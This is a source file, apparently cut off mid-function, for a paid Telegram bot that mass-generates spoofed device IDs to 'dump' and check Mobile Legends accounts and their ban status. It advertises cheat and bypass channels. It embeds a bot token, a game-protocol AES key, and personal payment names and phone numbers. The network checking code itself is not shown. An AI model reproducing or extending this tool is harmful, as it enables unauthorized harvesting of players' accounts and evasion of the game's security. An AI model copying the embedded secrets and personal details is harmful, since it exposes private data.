#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OXIDE BOT v3.8.1 FINAL
DEVELOPER - MICK
DEV - @PRIME_MICK

NEW in v3.8.1:
  - GENERATE DEVICE IDS auto-starts DUMPING (Valid Check)
  - No CONFIRM START needed after generation
  - IMAGE button sent as SEPARATE message
  - MmspCore-style SINGLE CHECK
  - FORCE CHECK: worker_ban retry + proper BAN/ERROR separation
  - Caption truncation (avoid BadRequest)
"""

import re
import io
import time
import zlib
import socket
import datetime
import random
import struct
import threading
import sys
import os
import shutil
import asyncio
import sqlite3
import zipfile
import concurrent.futures
from enum import Enum
from pathlib import Path
from collections import Counter

def _ensure(mod, pip=None):
    try:
        return __import__(mod)
    except ImportError:
        pip = pip or mod
        print(f"[!] Installing {pip}...")
        import subprocess
        subprocess.run([sys.executable, "-m", "pip", "install", pip,
                        "--break-system-packages", "-q"], check=False)
        return __import__(mod)

_ensure("zstandard")
_ensure("telegram", "python-telegram-bot>=21.0")
_ensure("Crypto", "pycryptodome")
_ensure("PIL", "Pillow")

import zstandard as zstd
from Crypto.Cipher import AES
from telegram import (
    Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove,
    InlineKeyboardButton, InlineKeyboardMarkup,
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler, ContextTypes, filters,
    CallbackQueryHandler,
)

try:
    from PIL import Image, ImageDraw, ImageFont
    _PIL_OK = True
except Exception:
    _PIL_OK = False

# ======================================================================
#  CONFIG
# ======================================================================
BOT_TOKEN = "8730619020:AAGptmWWo0UisEMSYPTFU29dSBrjNqVZwq8"
OWNER_ID = 8353748526
ADMIN_IDS = {8353748526}
BOT_NAME = "OXIDE"
DEVELOPER = "MICK"
DEV_TAG = "@PRIME_MICK"

FORCE_CHANNELS = [
    {"name": "CHEAT BY OXIDE", "url": "https://t.me/TRX_SIGNAL24",
     "username": "@TRX_SIGNAL24", "id": "-1003969829714"},
    {"name": "OXIDE BYPASS", "url": "https://t.me/TEAMVALT",
     "username": "@TEAMVALT", "id": "-1003958551428"},
]
TEMP_BAN_HOURS = 24
FORCE_CHECK_MAX_ROUNDS = 5

TRIAL_DAYS = 2
BUY_CONTACT = "@PRIME_MICK"
NEED_ACCESS_MSG = (
    "{no_entry} NEED ACCESS {no_entry}\n"
    "{crown} REDEEM THE KEY\n"
    "{thumb} BUY " + BUY_CONTACT
)


# ======================================================================
#  PLANS / PAYMENT / REFERRAL
# ======================================================================
PLANS = {
    "1": {"name": "1 DAY",  "days": 1,  "price": 1000,  "tag": "STARTER"},
    "2": {"name": "7 DAYS", "days": 7,  "price": 5000,  "tag": "BASIC"},
    "3": {"name": "30 DAYS","days": 30, "price": 20000, "tag": "PRO"},
    "4": {"name": "ADMIN PLAN", "days": 30, "price": 40000, "tag": "ADMIN"},
}

WAVE_PAY = {
    "name": "PHYUPHYUWIN",
    "number": "09758676468",
}

KBZ_PAY = {
    "name": "Daw Khin Than Swe",
    "number": "09258810660",
}

# Referral: 1 refer = 1 free checking (for ANY user, once per referred user)
REFERRAL_REWARD_CHECKS = 1


GEN_CHUNK_SIZE = 5000
GEN_MAX_UNLIMITED = 500_000_000

BAN_THREADS = 80
VALID_THREADS = 50
INFO_THREADS = 40
DUMPING_THREADS = 80

BASE_DIR = Path(os.environ.get("OXIDE_BOT_DIR", os.getcwd())).resolve()
BASE_DIR.mkdir(parents=True, exist_ok=True)
DB_PATH = str(BASE_DIR / "oxide.db")
USERS_DIR = BASE_DIR / "users"
USERS_DIR.mkdir(exist_ok=True)
IMG_CACHE_DIR = BASE_DIR / "img_cache"
IMG_CACHE_DIR.mkdir(exist_ok=True)
GEN_DIR = BASE_DIR / "gen_cache"
GEN_DIR.mkdir(exist_ok=True)

AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV = b'\x00' * 16
CLIENT_VERSION = '2.1.97.1232.1'
CHANNEL = 'and_usa'
LANGUAGE = 'en'

HIDDEN_TIERS_USER = {"World Collector", "Supreme Collector"}

COLLECTOR_BASE_ORDER = [
    "Amateur Collector", "Junior Collector", "Seasoned Collector",
    "Expert Collector", "Renowned Collector", "Exalted Collector",
    "Mega Collector", "World Collector", "Supreme Collector", "No Tier",
]
ROMAN_ORDER = {"V": 5, "IV": 4, "III": 3, "II": 2, "I": 1, "": 0}
_COLLECTOR_BASE_LOWER = {b.lower(): b for b in COLLECTOR_BASE_ORDER}

BAN_REASON_MAP = {
    "21": "Cheats", "22": "Using Plug-in Apps", "23": "Unauthorized Game Modifications",
    "24": "Scripts or Automation", "25": "Exploiting Game Bugs", "26": "Unauthorized Plugins",
    "27": "Using Bots", "28": "Matchmaking Manipulation", "29": "Intentionally Losing",
    "30": "AFK / Unsportsmanlike", "31": "Harassment / Abusive", "32": "Hate Speech",
    "33": "Threats / Inappropriate", "34": "Impersonation", "35": "Scamming / Fraud",
    "36": "Phishing", "37": "Malicious Links", "38": "Inappropriate Username",
    "39": "Inappropriate Profile", "40": "Account Sharing / Selling", "41": "Fraudulent Payment",
    "42": "Chargeback / Payment Abuse", "43": "Refund Abuse", "44": "Circumventing Ban",
    "45": "Security Vulnerability", "46": "Repeated TOS Violations", "47": "Code of Conduct Violation",
    "48": "Fair Play Violation", "49": "Game Security Violation",
}

HERO_ID_MAP = {
    1: "Miya", 2: "Balmond", 3: "Saber", 4: "Alice", 5: "Nana", 6: "Tigreal", 7: "Alucard",
    8: "Karina", 9: "Akai", 10: "Franco", 11: "Bane", 12: "Bruno", 13: "Clint", 14: "Rafaela",
    15: "Eudora", 16: "Zilong", 17: "Fanny", 18: "Layla", 19: "Minotaur", 20: "Lolita",
    21: "Hayabusa", 22: "Freya", 23: "Gord", 24: "Natalia", 25: "Kagura", 26: "Chou",
    27: "Sun", 28: "Alpha", 29: "Ruby", 30: "Yi Sun-shin", 31: "Moskov", 32: "Johnson",
    33: "Cyclops", 34: "Estes", 35: "Hilda", 36: "Aurora", 37: "Lapu-Lapu", 38: "Vexana",
    39: "Roger", 40: "Karrie", 41: "Gatotkaca", 42: "Harley", 43: "Irithel", 44: "Grock",
    45: "Argus", 46: "Odette", 47: "Lancelot", 48: "Diggie", 49: "Hylos", 50: "Zhask",
    51: "Helcurt", 52: "Pharsa", 53: "Lesley", 54: "Jawhead", 55: "Angela", 56: "Gusion",
    57: "Valir", 58: "Martis", 59: "Uranus", 60: "Hanabi", 61: "Chang'e", 62: "Kaja",
    63: "Selena", 64: "Aldous", 65: "Claude", 66: "Vale", 67: "Leomord", 68: "Lunox",
    69: "Hanzo", 70: "Belerick", 71: "Kimmy", 72: "Thamuz", 73: "Harith", 74: "Minsitthar",
    75: "Kadita", 76: "Faramis", 77: "Badang", 78: "Khufra", 79: "Granger", 80: "Guinevere",
    81: "Esmeralda", 82: "Terizla", 83: "X.Borg", 84: "Ling", 85: "Dyrroth", 86: "Lylia",
    87: "Baxia", 88: "Masha", 89: "Wanwan", 90: "Silvanna", 91: "Cecilion", 92: "Carmilla",
    93: "Atlas", 94: "Popol and Kupa", 95: "Yu Zhong", 96: "Luo Yi", 97: "Benedetta",
    98: "Khaleed", 99: "Barats", 100: "Brody", 101: "Yve", 102: "Mathilda", 103: "Paquito",
    104: "Gloo", 105: "Beatrix", 106: "Phoveus", 107: "Natan", 108: "Aulus", 109: "Aamon",
    110: "Valentina", 111: "Edith", 112: "Floryn", 113: "Yin", 114: "Melissa", 115: "Xavier",
    116: "Julian", 117: "Fredrinn", 118: "Joy", 119: "Novaria", 120: "Arlott", 121: "Ixia",
    122: "Nolan", 123: "Cici", 124: "Chip", 125: "Zhuxin", 126: "Suyou", 127: "Lukas",
    128: "Kalea", 129: "Zetian", 130: "Obsidia",
}

_BUTTON_STYLE_SUPPORTED = False
_INLINE_STYLE_SUPPORTED = False
try:
    import inspect
    _sig = inspect.signature(KeyboardButton.__init__)
    _BUTTON_STYLE_SUPPORTED = "style" in _sig.parameters
    _isig = inspect.signature(InlineKeyboardButton.__init__)
    _INLINE_STYLE_SUPPORTED = "style" in _isig.parameters
except Exception:
    pass

# Detect inline icon_custom_emoji_id support
_ICON_CUSTOM_EMOJI_SUPPORTED = False
try:
    import inspect as _ic_inspect
    _ic_sig = _ic_inspect.signature(InlineKeyboardButton.__init__)
    _ICON_CUSTOM_EMOJI_SUPPORTED = "icon_custom_emoji_id" in _ic_sig.parameters
except Exception:
    _ICON_CUSTOM_EMOJI_SUPPORTED = False



def KButton(text, style=None, icon_custom_emoji_id=None):
    """Build a KeyboardButton with optional style and premium icon."""
    kwargs = {"text": text}

    # Add style if supported
    if _BUTTON_STYLE_SUPPORTED and style:
        kwargs["style"] = style

    # Add premium icon if provided
    if icon_custom_emoji_id:
        kwargs["icon_custom_emoji_id"] = str(icon_custom_emoji_id)

    # Try full kwargs first
    try:
        return KeyboardButton(**kwargs)
    except Exception as e:
        print(f"[KBUTTON] full fail: {e}")
        # Fallback: strip style, keep icon
        kwargs.pop("style", None)
        try:
            return KeyboardButton(**kwargs)
        except Exception as e2:
            print(f"[KBUTTON] icon fail: {e2}")
            # Last resort: text only
            return KeyboardButton(text=text)


def IButton(text, callback_data=None, url=None, style=None, icon_custom_emoji_id=None):
    """Build InlineKeyboardButton with optional style + premium icon.
    
    Args:
        text: Button text
        callback_data: Callback data
        url: URL to open
        style: "danger" / "success" / "primary" (Bot API 9.4+)
        icon_custom_emoji_id: Premium emoji ID (Bot API 8.3+)
    """
    kwargs = {"text": text}
    if callback_data is not None:
        kwargs["callback_data"] = callback_data
    if url is not None:
        kwargs["url"] = url

    # Style support
    if _INLINE_STYLE_SUPPORTED and style:
        kwargs["style"] = style

    # Icon support
    if icon_custom_emoji_id and _ICON_CUSTOM_EMOJI_SUPPORTED:
        kwargs["icon_custom_emoji_id"] = str(icon_custom_emoji_id)

    # Try full
    try:
        return InlineKeyboardButton(**kwargs)
    except Exception as e:
        print(f"[IBUTTON] full fail: {e}")
        # Try without icon
        kwargs.pop("icon_custom_emoji_id", None)
        try:
            return InlineKeyboardButton(**kwargs)
        except Exception as e2:
            print(f"[IBUTTON] no-icon fail: {e2}")
            # Try without style
            kwargs.pop("style", None)
            try:
                return InlineKeyboardButton(**kwargs)
            except Exception as e3:
                print(f"[IBUTTON] text-only fail: {e3}")
                return InlineKeyboardButton(text=text, callback_data=callback_data)



class MLBBDeviceIDGenerator:
    def __init__(self):
        self.prefix = "and"

    def generate_md5(self, seed=None):
        import hashlib, uuid as _uuid
        if seed is None:
            seed = str(_uuid.uuid4()) + str(random.random()) + str(datetime.datetime.now().timestamp())
        return hashlib.md5(seed.encode()).hexdigest()

    def generate_android_id(self):
        return ''.join(random.choices('0123456789abcdef', k=16))

    def generate_one(self):
        import uuid as _uuid
        android_id = self.generate_android_id()
        r = random.random()
        if r < 0.34:
            advertising_id = str(_uuid.uuid4())
        elif r < 0.67:
            advertising_id = f"{_uuid.uuid4().hex[:8]}-{_uuid.uuid4().hex[:4]}-{_uuid.uuid4().hex[:4]}-{_uuid.uuid4().hex[:4]}-{_uuid.uuid4().hex[:12]}"
        else:
            advertising_id = '-'.join([
                ''.join(random.choices('0123456789abcdef', k=8)),
                ''.join(random.choices('0123456789abcdef', k=4)),
                ''.join(random.choices('0123456789abcdef', k=4)),
                ''.join(random.choices('0123456789abcdef', k=4)),
                ''.join(random.choices('0123456789abcdef', k=12)),
            ])
        imei_seed = f"{android_id}{advertising_id}{random.randint(100000000, 999999999)}{_uuid.uuid4()}"
        imei_md5 = self.generate_md5(imei_seed)
        return f"{self.prefix}_{imei_md5}{android_id}{advertising_id}"

    def generate_smart(self, count=1):
        return [self.generate_one() for _ in range(count)]


# ======================================================================
#  IMAGE
# ======================================================================
def _find_font(size=20, bold=True):
    import glob as _glob
    candidates = []
    termux_font_dir = "/data/data/com.termux/files/usr/share/fonts"
    if os.path.isdir(termux_font_dir):
        for root, _dirs, files in os.walk(termux_font_dir):
            for fn in files:
                if not fn.lower().endswith((".ttf", ".otf", ".ttc")):
                    continue
                if bold and any(k in fn.lower() for k in ("bold", "bd", "black")):
                    candidates.append(os.path.join(root, fn))
                elif not bold and any(k in fn.lower() for k in ("regular", "sans", "normal")):
                    candidates.append(os.path.join(root, fn))
    candidates += [
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf" if bold else "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
        "/data/data/com.termux/files/usr/share/fonts/TTF/DejaVuSans-Bold.ttf" if bold else "/data/data/com.termux/files/usr/share/fonts/TTF/DejaVuSans.ttf",
        "/data/data/com.termux/files/usr/share/fonts/TTF/Roboto-Bold.ttf" if bold else "/data/data/com.termux/files/usr/share/fonts/TTF/Roboto-Regular.ttf",
        "/system/fonts/Roboto-Bold.ttf" if bold else "/system/fonts/Roboto-Regular.ttf",
        "/System/Library/Fonts/Supplemental/Arial Bold.ttf" if bold else "/System/Library/Fonts/Supplemental/Arial.ttf",
        "C:\\Windows\\Fonts\\arialbd.ttf" if bold else "C:\\Windows\\Fonts\\arial.ttf",
    ]
    seen = set()
    for c in candidates:
        if c in seen:
            continue
        seen.add(c)
        try:
            if os.path.isfile(c):
                return ImageFont.truetype(c, size)
        except Exception:
            continue
    try:
        return ImageFont.load_default(size=size)
    except Exception:
        return ImageFont.load_default()


def _tsize(draw, text, font):
    try:
        bbox = draw.textbbox((0, 0), text, font=font)
        return bbox[2] - bbox[0], bbox[3] - bbox[1]
    except Exception:
        return draw.textsize(text, font=font)


def _gradient(width, height, c1, c2):
    img = Image.new("RGB", (width, height), c1)
    draw = ImageDraw.Draw(img)
    for y in range(height):
        t = y / max(height - 1, 1)
        r = int(c1[0] + (c2[0] - c1[0]) * t)
        g = int(c1[1] + (c2[1] - c1[1]) * t)
        b = int(c1[2] + (c2[2] - c1[2]) * t)
        draw.line([(0, y), (width, y)], fill=(r, g, b))
    return img


def _draw_footer(draw, width, total_h, footer_h):
    font_foot = _find_font(13, bold=False)
    font_foot2 = _find_font(15, bold=True)
    footer1 = f"{BOT_NAME} BOT  |  DEVELOPER: {DEVELOPER}"
    footer2 = f"DEV - {DEV_TAG}"
    footer3 = f"{time.strftime('%Y-%m-%d %H:%M:%S')}"
    fw, _ = _tsize(draw, footer1, font_foot)
    draw.text(((width - fw) // 2, total_h - footer_h + 6),
              footer1, font=font_foot, fill=(150, 150, 170))
    fw2, _ = _tsize(draw, footer2, font_foot2)
    draw.text(((width - fw2) // 2, total_h - footer_h + 26),
              footer2, font=font_foot2, fill=(0, 220, 255))
    fw3, _ = _tsize(draw, footer3, font_foot)
    draw.text(((width - fw3) // 2, total_h - footer_h + 50),
              footer3, font=font_foot, fill=(150, 150, 170))


def render_breakdown_image(title, sections, out_path=None, check_label=None):
    if not _PIL_OK:
        return None
    width = 1000
    padding = 35
    header_h = 160 if check_label else 120
    section_title_h = 60
    row_h = 46
    footer_h = 90
    total_h = header_h + padding
    for _, rows in sections:
        total_h += section_title_h + max(len(rows), 1) * row_h + 18
    total_h += footer_h + padding

    img = _gradient(width, total_h, (12, 14, 26), (28, 22, 48))
    draw = ImageDraw.Draw(img)
    header_img = _gradient(width, header_h, (0, 200, 255), (160, 80, 255))
    img.paste(header_img, (0, 0))

    font_title = _find_font(40, bold=True)
    font_sub = _find_font(22, bold=True)
    tw, th = _tsize(draw, title, font_title)
    ty = 30 if check_label else (header_h - th) // 2 - 4
    draw.text(((width - tw) // 2, ty), title, font=font_title, fill=(15, 15, 25))
    if check_label:
        lw, _ = _tsize(draw, check_label, font_sub)
        draw.text(((width - lw) // 2, ty + th + 8),
                  check_label, font=font_sub, fill=(30, 30, 50))

    y = header_h + padding
    bar_colors = [(0, 200, 255), (160, 80, 255), (80, 220, 120),
                  (255, 200, 60), (255, 90, 90), (180, 140, 255)]

    font_sec = _find_font(24, bold=True)
    font_row = _find_font(19, bold=True)
    font_count = _find_font(20, bold=True)

    for si, (sec_title, rows) in enumerate(sections):
        draw.rectangle([(padding, y), (width - padding, y + section_title_h - 12)],
                       fill=(45, 48, 70), outline=(80, 90, 130), width=1)
        draw.text((padding + 18, y + 12), sec_title, font=font_sec, fill=(255, 255, 255))
        y += section_title_h
        if not rows:
            draw.text((padding + 18, y + 8), "(none)", font=font_row, fill=(150, 150, 170))
            y += row_h + 18
            continue
        max_count = max((c for _, c in rows), default=1) or 1
        color = bar_colors[si % len(bar_colors)]
        for label, count in rows:
            draw.text((padding + 18, y + 10), str(label), font=font_row, fill=(220, 225, 245))
            bar_x = padding + 460
            bar_w = width - padding - 120 - bar_x
            fill_w = int(bar_w * (count / max_count)) if max_count else 0
            draw.rectangle([(bar_x, y + 14), (bar_x + bar_w, y + 34)], fill=(30, 32, 48))
            if fill_w > 0:
                draw.rectangle([(bar_x, y + 14), (bar_x + fill_w, y + 34)], fill=color)
                draw.rectangle([(bar_x, y + 14), (bar_x + fill_w, y + 20)],
                               fill=(min(255, color[0] + 60),
                                     min(255, color[1] + 60),
                                     min(255, color[2] + 60)))
            cw, _ = _tsize(draw, f"{count}", font_count)
            draw.text((width - padding - cw - 10, y + 8), f"{count}",
                      font=font_count, fill=(255, 255, 255))
            y += row_h
        y += 18

    _draw_footer(draw, width, total_h, footer_h)
    if out_path is None:
        out_path = IMG_CACHE_DIR / f"breakdown_{int(time.time()*1000)}.png"
    img.save(out_path, "PNG")
    return str(out_path)


def make_tier_breakdown_image(players, title="TIER BREAKDOWN", check_label=None):
    base_counter = Counter()
    for pd in players:
        base, roman, full = _normalize_collector_tier(pd.get("collector_tier", ""))
        if _is_hidden_tier_user(base):
            continue
        base_counter[full or "No Tier"] += 1

    # Sort by TIER RANK (highest tier first) then count desc
    def _tier_sort_key(item):
        tier_name, cnt = item
        base, roman, full = _normalize_collector_tier(tier_name)
        # Tier base order (higher = better) - reverse for descending
        base_rank = _base_sort_key(base)  # 0=Amateur, 9=No Tier
        # Convert to descending (higher tier = smaller rank)
        base_score = 999 - base_rank
        # Roman numeral (higher = better)
        roman_score = ROMAN_ORDER.get(roman, 0)
        return (-base_score, -roman_score, -cnt)

    sorted_tiers = sorted(base_counter.items(), key=_tier_sort_key)
    sections = [("Collector Tier", sorted_tiers)]
    return render_breakdown_image(title, sections, check_label=check_label)


def make_rank_breakdown_image(players, title="RANK BREAKDOWN", check_label=None):
    rank_counter = Counter()
    for pd in players:
        base, roman, full = _normalize_collector_tier(pd.get("collector_tier", ""))
        if _is_hidden_tier_user(base):
            continue
        rank = pd.get("high_rank") or pd.get("current_rank") or "Unknown"
        rank_counter[rank] += 1

    # Rank order: Mythical Immortal (highest) → Unranked (lowest)
    RANK_ORDER = {
        "Mythical Immortal": 100,
        "Mythical Glory":    90,
        "Mythical Honor":    80,
        "Mythic":            70,
        "Legend":            60,
        "Epic":              50,
        "Grandmaster":       40,
        "Master":            30,
        "Elite":             20,
        "Warrior":           10,
        "Unranked":          0,
        "Unknown":           -1,
    }

    def _rank_sort_key(item):
        rank_name, cnt = item
        # Extract base name (remove ★ and division)
        base = rank_name.split("(")[0].strip()
        for key in RANK_ORDER:
            if key.lower() in base.lower():
                return (-RANK_ORDER[key], -cnt)
        return (-RANK_ORDER["Unknown"], -cnt)

    sorted_ranks = sorted(rank_counter.items(), key=_rank_sort_key)
    sections = [("High Rank", sorted_ranks)]
    return render_breakdown_image(title, sections, check_label=check_label)


def make_full_breakdown_image(players, title="FULL BREAKDOWN", check_label=None):
    base_counter = Counter()
    rank_counter = Counter()
    v2l_counter = Counter()
    offline_counter = Counter()
    for pd in players:
        base, roman, full = _normalize_collector_tier(pd.get("collector_tier", ""))
        if _is_hidden_tier_user(base):
            continue
        base_counter[full or "No Tier"] += 1
        rank_counter[pd.get("high_rank") or pd.get("current_rank") or "Unknown"] += 1
        v2l_counter[pd.get("v2l_status", "N/A") or "N/A"] += 1
        days = _offline_days(pd.get("last_login_ts", 0))
        offline_counter[_bucket_offline(days)] += 1
    # Tier sort (high→low)
    def _tier_key(item):
        tier_name, cnt = item
        base, roman, full = _normalize_collector_tier(tier_name)
        base_rank = _base_sort_key(base)
        return (-(999 - base_rank), -ROMAN_ORDER.get(roman, 0), -cnt)

    # Rank sort (high→low)
    RANK_ORDER = {
        "Mythical Immortal": 100, "Mythical Glory": 90, "Mythical Honor": 80,
        "Mythic": 70, "Legend": 60, "Epic": 50, "Grandmaster": 40,
        "Master": 30, "Elite": 20, "Warrior": 10, "Unranked": 0, "Unknown": -1,
    }
    def _rank_key(item):
        rank_name, cnt = item
        base = rank_name.split("(")[0].strip()
        for key in RANK_ORDER:
            if key.lower() in base.lower():
                return (-RANK_ORDER[key], -cnt)
        return (-RANK_ORDER["Unknown"], -cnt)

    # V2L sort (Enabled → Disabled → N/A)
    V2L_ORDER = {"Enabled": 3, "Disabled": 2, "N/A": 1}
    def _v2l_key(item):
        v2l_name, cnt = item
        return (-V2L_ORDER.get(v2l_name, 0), -cnt)

    sections = [
        ("Collector Tier", sorted(base_counter.items(), key=_tier_key)),
        ("High Rank", sorted(rank_counter.items(), key=_rank_key)),
        ("V2L Status", sorted(v2l_counter.items(), key=_v2l_key)),
        ("Offline Days", sorted(offline_counter.items(), key=lambda x: x[0])),
    ]
    return render_breakdown_image(title, sections, check_label=check_label)


def make_player_info_image(pd, device_id="", role_id="", zone_id="",
                            title="SINGLE CHECK", banned_status=None):
    if not _PIL_OK:
        return None
    info = build_hit_txt(device_id, role_id, zone_id, pd, banned_status=banned_status)
    lines = info.split("\n")

    cleaned = []
    for ln in lines:
        if ln.strip().startswith("="):
            continue
        cleaned.append(ln)

    width = 1000
    padding = 35
    header_h = 160
    line_h = 30
    footer_h = 90
    total_h = header_h + padding + len(cleaned) * line_h + footer_h + padding

    img = _gradient(width, total_h, (12, 14, 26), (28, 22, 48))
    draw = ImageDraw.Draw(img)
    header_img = _gradient(width, header_h, (0, 200, 255), (160, 80, 255))
    img.paste(header_img, (0, 0))

    font_title = _find_font(40, bold=True)
    font_sub = _find_font(20, bold=True)
    font_line = _find_font(18, bold=True)
    font_sec = _find_font(20, bold=True)

    tw, th = _tsize(draw, title, font_title)
    draw.text(((width - tw) // 2, 28), title, font=font_title, fill=(15, 15, 25))
    sub = "SINGLE CHECKED"
    sw, _ = _tsize(draw, sub, font_sub)
    draw.text(((width - sw) // 2, 28 + th + 8), sub, font=font_sub, fill=(30, 30, 50))

    y = header_h + padding
    for line in cleaned:
        color = (220, 225, 245)
        if line.startswith("-----"):
            color = (0, 220, 255)
            draw.text((padding, y), line, font=font_sec, fill=color)
        else:
            draw.text((padding, y), line, font=font_line, fill=color)
        y += line_h

    _draw_footer(draw, width, total_h, footer_h)
    out = IMG_CACHE_DIR / f"player_{int(time.time()*1000)}.png"
    img.save(out, "PNG")
    return str(out)


def make_valid_total_image(total_input, total_valid,
                            check_label="DUMPING RESULT", title="DUMPING CHECK"):
    if not _PIL_OK:
        return None
    width = 1000
    height = 620
    img = _gradient(width, height, (12, 14, 26), (28, 22, 48))
    draw = ImageDraw.Draw(img)
    header_img = _gradient(width, 150, (0, 200, 255), (160, 80, 255))
    img.paste(header_img, (0, 0))

    font_title = _find_font(42, bold=True)
    font_sub = _find_font(22, bold=True)
    font_big = _find_font(100, bold=True)
    font_lbl = _find_font(28, bold=True)
    font_small = _find_font(20, bold=True)
    font_foot = _find_font(13, bold=False)
    font_foot2 = _find_font(15, bold=True)

    tw, th = _tsize(draw, title, font_title)
    draw.text(((width - tw) // 2, 26), title, font=font_title, fill=(15, 15, 25))
    cw, _ = _tsize(draw, check_label, font_sub)
    draw.text(((width - cw) // 2, 26 + th + 8), check_label, font=font_sub, fill=(30, 30, 50))

    big_num = f"{total_valid}"
    bw, bh = _tsize(draw, big_num, font_big)
    draw.text(((width - bw) // 2, 210), big_num, font=font_big, fill=(80, 240, 140))
    lbl = "TOTAL VALID"
    lw, _ = _tsize(draw, lbl, font_lbl)
    draw.text(((width - lw) // 2, 210 + bh + 10), lbl, font=font_lbl, fill=(220, 225, 245))

    invalid = max(0, total_input - total_valid)
    line1 = f"Input: {total_input}    |    Invalid: {invalid}"
    l1w, _ = _tsize(draw, line1, font_small)
    draw.text(((width - l1w) // 2, 210 + bh + 60), line1,
              font=font_small, fill=(190, 195, 215))

    _draw_footer(draw, width, height, 90)
    out = IMG_CACHE_DIR / f"valid_{int(time.time()*1000)}.png"
    img.save(out, "PNG")
    return str(out)


# ======================================================================
#  OFFLINE
# ======================================================================
OFFLINE_BUCKETS = [
    ("0-1 day", 0, 1), ("2-3 days", 2, 3), ("4-7 days", 4, 7),
    ("8-14 days", 8, 14), ("15-30 days", 15, 30), ("30+ days", 31, 999999),
]


def _offline_days(last_login_ts):
    try:
        ts = float(last_login_ts or 0)
        if ts <= 0:
            return None
        delta = time.time() - ts
        return 0 if delta < 0 else int(delta // 86400)
    except Exception:
        return None


def _bucket_offline(days):
    if days is None:
        return "Unknown"
    for label, lo, hi in OFFLINE_BUCKETS:
        if lo <= days <= hi:
            return label
    return "Unknown"


def _render_offline_breakdown(players, indent="    "):
    counts = {label: 0 for label, _, _ in OFFLINE_BUCKETS}
    unknown = 0
    total = 0
    for pd in players:
        days = _offline_days(pd.get("last_login_ts", 0))
        if days is None:
            unknown += 1
            continue
        bucket = _bucket_offline(days)
        if bucket in counts:
            counts[bucket] += 1
            total += 1
        else:
            unknown += 1
    lines = ["Offline Days Breakdown:"]
    mx = max(counts.values()) if counts else 1
    mx = max(mx, 1)
    for label, _, _ in OFFLINE_BUCKETS:
        cnt = counts.get(label, 0)
        bar_len = int(20 * cnt / mx)
        lines.append(f"{indent}{label:<12} {'#'*bar_len}{'.'*(20-bar_len)}  {cnt}")
    if unknown:
        lines.append(f"{indent}Unknown      {'-'*20}  {unknown}")
    lines.append(f"{indent}Total (with login): {total}")
    return "\n".join(lines)


# ======================================================================
#  JOB REGISTRY
# ======================================================================
_jobs_lock = threading.Lock()
_active_jobs = {}


def job_new(user_id, check_type="4step"):
    jid = f"{user_id}_{int(time.time())}_{id(threading.current_thread())}"
    with _jobs_lock:
        _active_jobs[jid] = {
            "state": "running", "step": 1, "step_name": "CLEAN",
            "done": 0, "total": 0, "user_id": user_id,
            "check_type": check_type, "started": time.time(),
            "chat_id": 0,
            "counts": {"clean": 0, "banned": 0, "valid": 0, "info": 0, "errors": 0},
            "valid_results": [], "banned_results": [], "valid_accounts": [],
        }
    return jid


def job_get(jid):
    with _jobs_lock:
        j = _active_jobs.get(jid)
        return dict(j) if j else None


def job_update(jid, **kwargs):
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid].update(kwargs)


def job_inc_count(jid, key, delta=1):
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid]["counts"][key] = _active_jobs[jid]["counts"].get(key, 0) + delta


def job_set_state(jid, state):
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid]["state"] = state


def job_inc(jid):
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid]["done"] += 1


def job_set_total(jid, total):
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid]["total"] = total
            _active_jobs[jid]["done"] = 0


def job_finish(jid):
    with _jobs_lock:
        _active_jobs.pop(jid, None)
    # Clear instant-stop flag
    try:
        _clear_stop(jid)
    except Exception:
        pass


def job_is_stopped(jid):
    with _jobs_lock:
        j = _active_jobs.get(jid)
        return (not j) or j["state"] == "stopped"


def job_append_valid(jid, acc, pd):
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid]["valid_results"].append((acc, pd))


def job_append_banned(jid, b):
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid]["banned_results"].append(b)


def job_append_valid_account(jid, acc):
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid]["valid_accounts"].append(acc)




# ======================================================================
#  INSTANT STOP — global stop flags per job
# ======================================================================
_STOP_FLAGS_LOCK = threading.Lock()
_STOP_FLAGS = {}  # jid -> True (stopped)


def _mark_stop(jid):
    with _STOP_FLAGS_LOCK:
        _STOP_FLAGS[jid] = True


def _is_stopped(jid):
    with _STOP_FLAGS_LOCK:
        return _STOP_FLAGS.get(jid, False)


def _clear_stop(jid):
    with _STOP_FLAGS_LOCK:
        _STOP_FLAGS.pop(jid, None)


# ======================================================================
#  GENERATION JOB
# ======================================================================
_gen_lock = threading.Lock()
_gen_jobs = {}


def gen_job_new(user_id, chat_id, target):
    jid = f"gen_{user_id}_{int(time.time())}"
    with _gen_lock:
        _gen_jobs[jid] = {
            "user_id": user_id, "chat_id": chat_id, "target": target,
            "generated": 0, "state": "running", "started": time.time(),
        }
    return jid


def gen_job_update(jid, **kwargs):
    with _gen_lock:
        if jid in _gen_jobs:
            _gen_jobs[jid].update(kwargs)


def gen_job_is_cancelled(jid):
    with _gen_lock:
        j = _gen_jobs.get(jid)
        return (not j) or j["state"] == "stopped"


def gen_job_finish(jid):
    with _gen_lock:
        _gen_jobs.pop(jid, None)


# ======================================================================
#  TIER NORMALIZATION
# ======================================================================
def _normalize_collector_tier(raw):
    if raw is None:
        return ("No Tier", "", "No Tier")
    s = str(raw).strip()
    if not s or s.lower() in ("unknown", "n/a", "na", "none", "-", "null"):
        return ("No Tier", "", "No Tier")
    s = re.sub(r"\s+", " ", s)
    m = re.match(r"^(.*?\bCollector)(?:\s+([IVX]+))?$", s, re.I)
    if not m:
        m2 = re.match(r"^(.*?)(?:\s+([IVX]+))?$", s, re.I)
        if m2:
            base_raw = m2.group(1).strip()
            roman = (m2.group(2) or "").upper()
        else:
            base_raw, roman = s, ""
    else:
        base_raw = m.group(1).strip()
        roman = (m.group(2) or "").upper()
    canonical = _COLLECTOR_BASE_LOWER.get(base_raw.lower())
    if canonical is None:
